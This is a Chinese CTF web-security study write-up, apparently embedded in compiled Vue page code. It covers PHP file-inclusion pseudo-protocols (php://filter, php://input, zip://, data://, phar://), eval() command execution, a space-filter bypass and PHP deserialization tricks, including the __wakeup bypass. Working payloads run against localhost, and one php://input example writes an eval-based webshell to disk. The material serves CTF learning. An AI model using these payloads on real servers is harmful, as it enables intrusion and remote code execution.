参数</th><th>描述</th><th></th></tr></thead><tbody><tr><td>resource=&lt;要过滤的数据流&gt;</td><td>必须项。它指定了你要筛选过滤的数据流。</td><td></td></tr><tr><td>read=&lt;读链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（*\\</td><td>*）分隔。</td></tr><tr><td>write=&lt;写链的过滤器&gt;</td><td>可选项。可以设定一个或多个过滤器名称，以管道符（\\</td><td>）分隔。</td></tr><tr><td>&lt;; 两个链的过滤器&gt;</td><td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td><td></td></tr></tbody></table></li>",4),dn=n("p",null,[n("strong",null,"可用的过滤器列表（4类）")],-1),rn={href:"https://link.segmentfault.com/?enc=%2BScuuAKhKBrETSFSxeZFNg%3D%3D.55xVN7GO2bm6FIXeqxxno64MaW1xXlHlKgBq5sNB2QaIsej%2BKq4%2BrYYxkVW%2BEshH",target:"_blank",rel:"noopener noreferrer"},un=t("<table><thead><tr><th>字符串过滤器</th><th>作用</th></tr></thead><tbody><tr><td>string.rot13</td><td>等同于<code>str_rot13()</code>，rot13变换</td></tr><tr><td>string.toupper</td><td>等同于<code>strtoupper()</code>，转大写字母</td></tr><tr><td>string.tolower</td><td>等同于<code>strtolower()</code>，转小写字母</td></tr><tr><td>string.strip_tags</td><td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td></tr></tbody></table><table><thead><tr><th>转换过滤器</th><th>作用</th></tr></thead><tbody><tr><td>convert.base64-encode &amp; convert.base64-decode</td><td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td></tr><tr><td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td><td>quoted-printable 字符串与 8-bit 字符串编码解码</td></tr></tbody></table><table><thead><tr><th>压缩过滤器</th><th>作用</th></tr></thead><tbody><tr><td>zlib.deflate &amp; zlib.inflate</td><td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td></tr><tr><td>bzip2.compress &amp; bzip2.decompress</td><td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td></tr></tbody></table><table><thead><tr><th>加密过滤器</th><th>作用</th></tr></thead><tbody><tr><td>mcrypt.*</td><td>libmcrypt 对称加密算法</td></tr><tr><td>mdecrypt.*</td><td>libmcrypt 对称解密算法</td></tr></tbody></table>",4),mn=t(`<li><p><strong>示例</strong>：</p><ol><li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p><div class="language-livecodeserver line-numbers-mode" data-ext="livecodeserver"><pre class="language-livecodeserver"><code>http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+x+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure></li><li><p><code>php://input + [POST DATA]</code>执行php代码</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code>http://127.0.0.1/include.php?file=php://input
[POST DATA部分]
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+z+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>若有写入权限，写入一句话木马</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code>http://127.0.0.1/include.php?file=php://input
[POST DATA部分]
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;1juhua.php&#39;</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;w&#39;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+P+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure></li></ol></li>',1),vn=n("strong",null,"参考",-1),kn={href:"https://link.segmentfault.com/?enc=juZnqmg2HQMZii5vLbm1bQ%3D%3D.f4xV6RjgZWGtUZ%2FjtD%2BE4GPxKFoDqttbkcw61aLWdrXwAqdVpt4QM0sZ%2Bw48219A",target:"_blank",rel:"noopener noreferrer"},bn=n("h3",{id:"zip-bzip2-zlib-协议",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#zip-bzip2-zlib-协议","aria-hidden":"true"},"#"),s(),n("code",null,"zip:// & bzip2:// & zlib://"),s(" 协议")],-1),gn=t(`<li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:off/on</li><li><code>allow_url_include</code> :off/on</li></ul></li><li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p></li><li><p><strong>示例</strong>：</p><ol><li><p><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）</p><p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1/include.php?file=zip://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.jpg%23phpinfo.txt</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+D+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure></li><li><p><code>compress.bzip2://file.bz2</code></p><p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1/include.php?file=compress.bzip2://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.bz2</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+$+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure></li><li><p><code>compress.zlib://file.gz</code></p><p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1/include.php?file=compress.zlib://E:\\phpStudy\\PHPTutorial\\WWW\\phpinfo.gz</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+H+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure></li></ol></li>',3),hn=n("strong",null,"参考",-1),fn={href:"https://link.segmentfault.com/?enc=c7kLn2116lHYz%2Bxdh8uWLg%3D%3D.sj39fMX2XLCmDRe1yx3bXe0O%2Bl37DHiuTIrhp7TD4ecbPodccTGwi7qnB9m8IDmNVyGc5NV8nkQb6X9PUiRlow%3D%3D",target:"_blank",rel:"noopener noreferrer"},_n=t(`<h3 id="data-协议" tabindex="-1"><a class="header-anchor" href="#data-协议" aria-hidden="true">#</a> <code>data://</code> 协议</h3><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p><strong>用法</strong>：</p><div class="language-awk line-numbers-mode" data-ext="awk"><pre class="language-awk"><code>data<span class="token operator">:</span><span class="token regex">//</span>text<span class="token operator">/</span>plain<span class="token punctuation">,</span>
data<span class="token operator">:</span><span class="token regex">//</span>text<span class="token operator">/</span>plain<span class="token punctuation">;</span>base64<span class="token punctuation">,</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p><strong>示例</strong>：</p><ol><li><p><code>data://text/plain,</code></p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li><li><p><code>data://text/plain;base64,</code></p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+N+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure></li></ol></li></ul><h3 id="http-https-协议" tabindex="-1"><a class="header-anchor" href="#http-https-协议" aria-hidden="true">#</a> <code>http:// &amp; https://</code> 协议</h3><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p></li><li><p><strong>用法</strong>：</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//example.com</span></span>
<span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//example.com/file.php?var1=val1&amp;var2=val2</span></span>
<span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//user:password@example.com</span></span>
<span class="token header"><span class="token header-name keyword">https</span><span class="token punctuation">:</span><span class="token header-value">//example.com</span></span>
<span class="token header"><span class="token header-name keyword">https</span><span class="token punctuation">:</span><span class="token header-value">//example.com/file.php?var1=val1&amp;var2=val2</span></span>
<span class="token header"><span class="token header-name keyword">https</span><span class="token punctuation">:</span><span class="token header-value">//user:password@example.com</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p><strong>示例</strong>：</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+T+`" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure></li></ul><h3 id="phar-协议" tabindex="-1"><a class="header-anchor" href="#phar-协议" aria-hidden="true">#</a> <code>phar://</code> 协议</h3><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p><div class="language-http line-numbers-mode" data-ext="http"><pre class="language-http"><code><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+B+'" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar://协议对象注入技术</strong>。</p><p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p>',10),qn={href:"https://link.segmentfault.com/?enc=w%2Bh6RmR%2B%2ByO1MANgSOjvqw%3D%3D.Aawch9shmel0TLvUa8J1QRwwpCGK%2FDai6cqfAaGTxJg%3D",target:"_blank",rel:"noopener noreferrer"},yn=t('<h2 id="_3-php-eval-rce" tabindex="-1"><a class="header-anchor" href="#_3-php-eval-rce" aria-hidden="true">#</a> 3. php eval() RCE</h2><p>题目里代码是<code>eval()</code>，只需要把命令放到<code>system()</code>函数里就行。<strong>记得后面加分号！！！</strong></p><figure><img src="'+E+'" alt="image-20240812165242418" tabindex="0" loading="lazy"><figcaption>image-20240812165242418</figcaption></figure><p>改成POST也是一样</p><figure><img src="'+W+'" alt="image-20240812165631950" tabindex="0" loading="lazy"><figcaption>image-20240812165631950</figcaption></figure><h2 id="_4-php-后台过滤空格绕过" tabindex="-1"><a class="header-anchor" href="#_4-php-后台过滤空格绕过" aria-hidden="true">#</a> 4. php 后台过滤空格绕过</h2><p>题目</p><figure><img src="'+O+'" alt="image-20240812173258342" tabindex="0" loading="lazy"><figcaption>image-20240812173258342</figcaption></figure><p>这里先要求改cookie，在返回包中看见了新目录：<code>rasalghul.php</code>。但不是重点，后面这样</p><figure><img src="'+Q+'" alt="image-20240812173341997" tabindex="0" loading="lazy"><figcaption>image-20240812173341997</figcaption></figure><p>这里过滤了空格，我使用<code>%09</code>(<code>Tab</code>)绕过</p><figure><img src="'+V+'" alt="image-20240812173552674" tabindex="0" loading="lazy"><figcaption>image-20240812173552674</figcaption></figure><h2 id="_5-php反序列化" tabindex="-1"><a class="header-anchor" href="#_5-php反序列化" aria-hidden="true">#</a> 5. php反序列化</h2><p>题目开始先要目录扫描，发现一个<code>robots.txt</code>，进而发现了<code>/cl45s.php</code></p><figure><img src="'+C+`" alt="image-20240812175337606" tabindex="0" loading="lazy"><figcaption>image-20240812175337606</figcaption></figure><p>看到<code>__destruct()</code>方法被重写，则可以尝试反序列化。</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">wllm</span><span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$passwd</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">admin</span> <span class="token operator">=</span><span class="token string double-quoted-string">&quot;user&quot;</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">passwd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;123456&quot;</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">admin</span> <span class="token operator">===</span> <span class="token string double-quoted-string">&quot;admin&quot;</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">passwd</span> <span class="token operator">===</span> <span class="token string double-quoted-string">&quot;ctf&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token comment">// include(&quot;flag.php&quot;);</span>
            <span class="token comment">// echo $flag;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">admin</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">passwd</span><span class="token punctuation">;</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;Just a bit more!&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token variable">$aa</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">wllm</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$aa</span><span class="token operator">-&gt;</span><span class="token property">admin</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;admin&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$aa</span><span class="token operator">-&gt;</span><span class="token property">passwd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;ctf&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$stus</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$aa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$stus</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="`+G+`" alt="image-20240812180149556" tabindex="0" loading="lazy"><figcaption>image-20240812180149556</figcaption></figure><p>得到序列化的结果（其实不写代码也行，这快能自己编出来）</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>O:4:&quot;wllm&quot;:2:{s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:3:&quot;ctf&quot;;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><code>/?p=O:4:“wllm”:2:{s:5:“admin”;s:5:“admin”;s:6:“passwd”;s:3:“ctf”;}</code></p><p>最后得到flag</p><figure><img src="`+A+`" alt="image-20240812180404781" tabindex="0" loading="lazy"><figcaption>image-20240812180404781</figcaption></figure><h2 id="_6-php反序列化绕过-weakup" tabindex="-1"><a class="header-anchor" href="#_6-php反序列化绕过-weakup" aria-hidden="true">#</a> 6. php反序列化绕过<code>__weakup()</code></h2><p>题目</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;Content-type:text/html;charset=utf-8&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;class.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">class</span> <span class="token class-name-definition class-name">HaHaHa</span><span class="token punctuation">{</span>


        <span class="token keyword">public</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token variable">$passwd</span><span class="token punctuation">;</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">admin</span> <span class="token operator">=</span><span class="token string double-quoted-string">&quot;user&quot;</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">passwd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;123456&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">passwd</span> <span class="token operator">=</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">passwd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">admin</span> <span class="token operator">===</span> <span class="token string double-quoted-string">&quot;admin&quot;</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">passwd</span> <span class="token operator">===</span> <span class="token string double-quoted-string">&quot;wllm&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;flag.php&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">passwd</span><span class="token punctuation">;</span>
                <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;No wake up&quot;</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

<span class="token variable">$Letmeseesee</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&#39;p&#39;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$Letmeseesee</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这比上面多了个<code>__wakeup()</code> ，在29行程序调用反序列化方法时，会自动执行<code>__weakup()</code>函数，而显然weakup方法会加密上传的序列化参数中的passwd，而sha1是不可逆加密算法，目前也没有合适的sha1碰撞的方式，故考虑到绕过<code>__weakup()</code>函数；</p><p>php的特性，当序列化后对象的参数列表中成员个数和实际个数不符合时会绕过 <code>__weakup()</code>; 因而先构造</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$aa</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HaHaHa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$aa</span><span class="token operator">-&gt;</span><span class="token property">admin</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;admin&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$aa</span><span class="token operator">-&gt;</span><span class="token property">passwd</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;wllm&quot;</span><span class="token punctuation">;</span>
<span class="token variable">$stus</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$aa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$stus</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>得到</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>O:6:&quot;HaHaHa&quot;:2:{s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>修改得到</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>O:6:&quot;HaHaHa&quot;:3:{s:5:&quot;admin&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:4:&quot;wllm&quot;;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>上传即可</p><figure><img src="`+F+'" alt="image-20240813220240174" tabindex="0" loading="lazy"><figcaption>image-20240813220240174</figcaption></figure>',35);function wn(xn,zn){const a=i("ExternalLinkIcon");return o(),l("div",null,[I,n("p",null,[s("解题参考 "),n("a",L,[s("PHP md5 相等绕过 - Ainsliaea - 博客园 (cnblogs.com)"),e(a)])]),R,n("p",null,[X,s(" 利用 fastcoll 进行 md5 碰撞，生成两个字面值不同但 md5 相同的文件。"),n("a",j,[s("HashClash (tue.nl)"),e(a)])]),Z,n("p",null,[s("根据这篇文章["),n("a",M,[s("1]"),e(a)]),s("，")]),U,n("p",null,[s("md5 碰撞面对一些绕过非常有用，例如通过参数上传一句话木马["),n("a",K,[s("2]"),e(a)]),s("。")]),J,n("ol",null,[n("li",null,[s("https://zhuanlan.zhihu.com/p/123235283 "),n("a",Y,[s("↩︎"),e(a)])]),n("li",null,[s("https://www.cnblogs.com/Riv3r1and/p/13795704.html "),n("a",nn,[s("↩︎"),e(a)])])]),sn,n("p",null,[s("参考"),n("a",an,[s("PHP伪协议总结 - 个人文章 - SegmentFault 思否"),e(a)])]),en,n("ul",null,[tn,n("li",null,[n("p",null,[pn,s("："),n("a",on,[s("http://php.net/manual/zh/wrappers.file.php"),e(a)])])])]),ln,n("ul",null,[cn,n("li",null,[dn,n("p",null,[s("此处列举主要的过滤器类型，详细内容请参考："),n("a",rn,[s("https://www.php.net/manual/zh/filters.php"),e(a)])]),un]),mn,n("li",null,[n("p",null,[vn,s("："),n("a",kn,[s("https://php.net/manual/zh/wrappers.php.php"),e(a)])])])]),bn,n("ul",null,[gn,n("li",null,[n("p",null,[hn,s("："),n("a",fn,[s("http://php.net/manual/zh/wrappers.compression.php"),e(a)])])])]),_n,n("blockquote",null,[n("p",null,[s("参考文章："),n("a",qn,[s("seebug - 利用 phar 拓展 php 反序列化漏洞攻击面"),e(a)])])]),yn])}const $n=p(S,[["render",wn],["__file","1-CTF_WEB.html.vue"]]);export{$n as default};
